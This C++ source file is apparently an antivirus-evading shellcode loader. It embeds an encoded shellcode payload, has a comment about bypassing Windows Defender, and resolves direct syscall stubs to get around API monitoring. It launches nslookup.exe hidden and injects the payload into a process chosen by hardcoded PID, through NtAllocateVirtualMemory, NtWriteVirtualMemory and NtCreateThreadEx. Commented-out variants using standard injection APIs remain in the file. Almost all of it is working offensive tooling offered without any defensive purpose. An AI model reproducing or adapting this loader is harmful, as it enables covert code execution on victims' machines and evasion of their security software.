#include <iostream>
#include "Windows.h"
#include "winternl.h"
#include "getSyscall.h"
#include <fstream>
#pragma comment(lib, "ntdll")

/*
unsigned char shellcode[] =
"sadfsadfsfasdfasdfas"
"asdfasdftasdfawrtasd";
*/

/* Figure out how to generate shellcode that will bypass WindowsDefender*/
unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x42\xc8\x4d\xe4\x13\x4a\x7e\x09\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbe\x80\xce\x00\xe3\xa2"
"\xbe\x09\x42\xc8\x0c\xb5\x52\x1a\x2c\x58\x14\x80\x7c\x36\x76"
"\x02\xf5\x5b\x22\x80\xc6\xb6\x0b\x02\xf5\x5b\x62\x80\xc6\x96"
"\x43\x02\x71\xbe\x08\x82\x00\xd5\xda\x02\x4f\xc9\xee\xf4\x2c"
"\x98\x11\x66\x5e\x48\x83\x01\x40\xa5\x12\x8b\x9c\xe4\x10\x89"
"\x1c\xac\x98\x18\x5e\x82\x00\xf4\x05\xe5\xc3\xc1\xfe\x81\x42"
"\xc8\x4d\xac\x96\x8a\x0a\x6e\x0a\xc9\x9d\xb4\x98\x02\x66\x4d"
"\xc9\x88\x6d\xad\x12\x9a\x9d\x5f\x0a\x37\x84\xa5\x98\x7e\xf6"
"\x41\x43\x1e\x00\xd5\xda\x02\x4f\xc9\xee\x89\x8c\x2d\x1e\x0b"
"\x7f\xc8\x7a\x28\x38\x15\x5f\x49\x32\x2d\x4a\x8d\x74\x35\x66"
"\x92\x26\x4d\xc9\x88\x69\xad\x12\x9a\x18\x48\xc9\xc4\x05\xa0"
"\x98\x0a\x62\x40\x43\x18\x0c\x6f\x17\xc2\x36\x08\x92\x89\x15"
"\xa5\x4b\x14\x27\x53\x03\x90\x0c\xbd\x52\x10\x36\x8a\xae\xe8"
"\x0c\xb6\xec\xaa\x26\x48\x1b\x92\x05\x6f\x01\xa3\x29\xf6\xbd"
"\x37\x10\xad\xad\x3d\x0d\x3b\x1d\xfb\x7f\xe4\x13\x0b\x28\x40"
"\xcb\x2e\x05\x65\xff\xea\x7f\x09\x42\x81\xc4\x01\x5a\xf6\x7c"
"\x09\x47\xf1\x8d\x4c\x38\x4b\x3f\x5d\x0b\x41\xa9\xa8\x9a\xbb"
"\x3f\xb3\x0e\xbf\x6b\xe3\xec\x9f\x32\x80\xa8\xa0\x4c\xe5\x13"
"\x4a\x27\x48\xf8\xe1\xcd\x8f\x13\xb5\xab\x59\x12\x85\x7c\x2d"
"\x5e\x7b\xbe\x41\xbd\x08\x05\x6d\xd1\x02\x81\xc9\x0a\x41\x8c"
"\xa5\xa9\xa0\x71\xd6\xa2\x37\x98\xac\x9a\x8d\x14\x19\x03\x90"
"\x01\x6d\xf1\x02\xf7\xf0\x03\x72\xd4\x41\x67\x2b\x81\xdc\x0a"
"\x49\x89\xa4\x11\x4a\x7e\x40\xfa\xab\x20\x80\x13\x4a\x7e\x09"
"\x42\x89\x1d\xa5\x43\x02\xf7\xeb\x15\x9f\x1a\xa9\x22\x8a\x14"
"\x04\x1b\x89\x1d\x06\xef\x2c\xb9\x4d\x66\x9c\x4c\xe5\x5b\xc7"
"\x3a\x2d\x5a\x0e\x4d\x8c\x5b\xc3\x98\x5f\x12\x89\x1d\xa5\x43"
"\x0b\x2e\x40\xbd\x08\x0c\xb4\x5a\xb5\xb6\x44\xcb\x09\x01\x6d"
"\xd2\x0b\xc4\x70\x8e\xf7\xcb\x1b\xc6\x02\x4f\xdb\x0a\x37\x87"
"\x6f\x1d\x0b\xc4\x01\xc5\xd5\x2d\x1b\xc6\xf1\x8e\xbc\xe0\x9e"
"\x0c\x5e\xb5\xdf\xc3\x94\xbd\x1d\x05\x67\xd7\x62\x42\x0f\x3e"
"\xc2\xcd\x1f\xf3\x3f\x7b\xb2\x05\xdb\x3f\x8b\x79\x4a\x27\x48"
"\xcb\x12\xb2\x31\x13\x4a\x7e\x09";

using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, unsigned char* Buffer, ULONG RegionSize, PULONG numBytesWritten);

using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

int main(int argc, char* argv[]) {

	/* RICARDO PUT YOUR CODE HERE */
	char code[300];
    memset(code, '\0', sizeof(code));
    FILE *fptr;

    if ((fptr = fopen("./shellcode.txt","r")) == NULL){
    	exit(1);
    }
    char tmp[300];
    while(fscanf(fptr,"%s",tmp)==1){
        strcat(code,tmp);
    }
    fclose(fptr);
	/* RICARDO DON'T PUT YOUR CODE AFTER THIS LINE */

	char syscallStub[SYSCALL_STUB_SIZE] = {};
	char syscallStub2[SYSCALL_STUB_SIZE] = {};
	char syscallStub3[SYSCALL_STUB_SIZE] = {};
	char syscallStub4[SYSCALL_STUB_SIZE] = {};
	DWORD oldProtection = 0;

	// variables for NtCreateFile
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = NULL;
	UNICODE_STRING fileName;
	RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\temp\\pw.log");
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// variables for NtAllocateVirtualMemory & NtWriteVirtualMemory
	HANDLE processHandle = NULL;
	SIZE_T RegionSize = sizeof(shellcode);
	LPVOID allocation_start;

	// variables for NtCreateThreadEx
	HANDLE hThread;

	// define NtCreateFile
	myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub;
	VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// define NtAllocateVirtualMemory
	myNtAllocateVirutalMemory NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub2;
	VirtualProtect(syscallStub2, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// define NtWriteVirtualMemory
	myNtWriteVirtualMemory NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub3;
	VirtualProtect(syscallStub3, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// define NtCreateThreadEx
	myNtCreateThreadEx NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub4;
	VirtualProtect(syscallStub4, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	GetSyscallStub("NtCreateFile", syscallStub);
	GetSyscallStub("NtAllocateVirtualMemory", syscallStub2);
	GetSyscallStub("NtWriteVirtualMemory", syscallStub3);
	GetSyscallStub("NtCreateThreadEx", syscallStub4);
	
	/* The below code starts the process nslookup.exe so we can inject above shellcode into it. */
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPCWSTR cmd;
	HANDLE hProcess;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

	if (!CreateProcess(
		cmd,							// Executable
		NULL,							// Command line
		NULL,							// Process handle not inheritable
		NULL,							// Thread handle not inheritable
		FALSE,							// Set handle inheritance to FALSE
		CREATE_NO_WINDOW,	            // Do Not Open a Window
		NULL,							// Use parent's environment block
		NULL,							// Use parent's starting directory 
		&si,			                // Pointer to STARTUPINFO structure
		&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	)) {
		DWORD errval = GetLastError();
		std::cout << "FAILED" << errval << std::endl;
	}
	WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.



	/* creates file using direct syscall. only here for testing and referncing, not actually useful and will be deleted soon */

	//NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	
	

	/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/
	
	//allocation_start = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//WriteProcessMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), NULL);
	//CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);

	
	
	/* this code will inject into remote process that we did create (nslookup.exe from above) using direct syscalls */
	
	//allocation_start = nullptr;
	//NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
	//NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
	
	
	
	/* this code will inject into a remote process that we didnt start given PID using direct syscalls*/
	
	HANDLE procHandle;
	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10904);

	allocation_start = nullptr;
	NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(procHandle, allocation_start, shellcode, sizeof(shellcode), 0);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

	return 0;
}